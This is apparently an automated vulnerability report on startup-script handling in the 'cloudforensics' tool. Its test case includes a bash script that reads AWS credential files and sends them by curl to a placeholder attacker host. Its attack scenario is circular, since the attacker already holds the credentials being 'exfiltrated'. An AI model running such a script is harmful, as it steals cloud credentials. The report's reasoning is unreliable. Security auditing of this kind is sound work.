### Vulnerability List:

- Vulnerability Name: Credential Exposure via Startup Scripts
- Description:
    - An attacker socially engineers a user into using compromised cloud provider credentials with the `cloudforensics` tool.
    - The user attempts to start an analysis VM using the tool with the compromised credentials.
    - The tool allows users to specify a `STARTUP_SCRIPT` environment variable or `--launch_script` argument.
    - If the user uses a startup script, the content of this script is shipped to the newly created analysis VM and executed during the first boot.
    - An attacker can craft a malicious startup script that exfiltrates the cloud provider credentials stored in the environment variables of the analysis VM to an attacker-controlled location.
    - The attacker gains unauthorized access to the cloud environments that the user is attempting to investigate by using the exfiltrated credentials.
- Impact:
    - Unauthorized access to cloud environments.
    - An attacker can gain full control over the cloud resources the compromised credentials have access to, potentially leading to data breaches, resource manipulation, and further compromise of the cloud infrastructure.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - None
- Missing Mitigations:
    - Secure handling of startup scripts:
        - Avoid passing sensitive credentials as environment variables to startup scripts.
        - Implement secure way to pass configuration to startup scripts, e.g., using GCP Secret Manager or AWS Secrets Manager.
        - Warn users about the security risks of using custom startup scripts and recommend against including sensitive information in them in the documentation and CLI help messages.
    - Input validation and sanitization for startup scripts:
        - Although difficult, attempt to sanitize or validate startup scripts to prevent malicious code execution.
        - Implement a sandbox environment for startup script execution to limit potential damage.
    - Principle of least privilege for analysis VMs:
        - Ensure that analysis VMs are created with the minimum necessary privileges to perform forensic analysis, limiting the impact of compromised credentials.
- Preconditions:
    - An attacker socially engineers a user into using compromised cloud provider credentials with the `cloudforensics` tool.
    - The user uses a custom startup script (either via `STARTUP_SCRIPT` environment variable or `--launch_script` argument) when starting an analysis VM.
- Source Code Analysis:
    - File: `/code/docs/usermanual/index.md`
        - The documentation highlights the `STARTUP_SCRIPT` pro tip for GCP, AWS, and Azure, suggesting its usage for preprocessing.
        - It states: "you can export an environment variable 'STARTUP_SCRIPT' that points to a custom bash script. This script will be shipped to the instance being created and executed during the first boot. You can do any kind of pre-processing you want in this script."
        - This documentation encourages the use of custom startup scripts without explicitly warning about the security risks of executing untrusted code or handling sensitive data within these scripts.
    - File: `/code/tools/aws_cli.py`, `/code/tools/az_cli.py`, `/code/tools/gcp_cli.py`
        - The CLI tools for each cloud provider define the `--launch_script` argument, which is passed down to the `forensics.StartAnalysisVm` functions.
    - File: `/code/libcloudforensics/providers/aws/forensics.py`, `/code/libcloudforensics/providers/azure/forensics.py`, `/code/libcloudforensics/providers/gcp/forensics.py`
        - The `StartAnalysisVm` functions in each provider's forensics module accept the `userdata_file` argument, which is used to read the startup script content using `utils.ReadStartupScript` and pass it to the cloud provider's VM creation API.
    - File: `/code/libcloudforensics/scripts/utils.py`
        - The `ReadStartupScript` function reads the content of the startup script file specified by the `filename` argument or the `STARTUP_SCRIPT` environment variable.
    - File: `/code/libcloudforensics/scripts/forensics_packages_startup_aws.sh`, `/code/libcloudforensics/scripts/forensics_packages_startup.sh`
        - Example startup scripts are provided to install forensic packages, demonstrating the intended use of startup scripts without security considerations for credential exposure.
    - There is no input validation or sanitization implemented for the startup scripts.
    - The code does not prevent users from creating and using startup scripts that could potentially exfiltrate credentials or perform other malicious actions.
- Security Test Case:
    1. **Setup:**
        - Attacker sets up a simple HTTP server to receive exfiltrated credentials (e.g., using `netcat` or `python -m http.server`).
        - Attacker creates a malicious startup script (`malicious_startup.sh`) that does the following:
            ```bash
            #!/bin/bash
            # Malicious Startup Script to Exfiltrate AWS Credentials

            # Exfiltrate AWS credentials by sending them to the attacker's HTTP server
            CREDENTIALS=$(cat /root/.aws/credentials)
            curl "http://attacker-ip:attacker-port/?credentials=$CREDENTIALS"

            # Optional: To also demonstrate exfiltration of environment variables
            # ENV_VARS=$(env)
            # curl "http://attacker-ip:attacker-port/?env_vars=$ENV_VARS"

            echo "Malicious script executed."
            ```
            - Replace `attacker-ip:attacker-port` with the attacker's HTTP server address.
        - Saves the malicious script as `malicious_startup.sh`.
        - Attacker obtains compromised AWS credentials (or Azure/GCP credentials). For AWS, configure a profile named `compromised_profile` in `~/.aws/credentials` with these compromised credentials.
    2. **Execution:**
        - Attacker socially engineers a user to use the `cloudforensics` tool with the `compromised_profile` and the malicious startup script.
        - The user, intending to investigate their AWS environment, executes the following command:
            ```bash
            export STARTUP_SCRIPT=$(pwd)/malicious_startup.sh
            cloudforensics aws us-east-1 listinstances --profile compromised_profile
            ```
            - Or, to explicitly use the `--launch_script` argument:
            ```bash
            cloudforensics aws us-east-1 startvm analysis-vm --profile compromised_profile --launch_script malicious_startup.sh
            ```
        - The `cloudforensics` tool attempts to list instances (or starts an analysis VM), utilizing the compromised credentials.
        - The malicious startup script executes on the analysis VM during its boot process.
        - The malicious script exfiltrates the AWS credentials to the attacker's HTTP server.
    3. **Verification:**
        - Attacker checks their HTTP server logs and verifies that the AWS credentials from the analysis VM are successfully exfiltrated. The server logs should contain entries showing the `curl` requests with the credentials in the query parameters.
        - Attacker uses the exfiltrated credentials (e.g., by configuring the AWS CLI with the exfiltrated access key and secret key) to access and control the AWS environment associated with the `compromised_profile`.
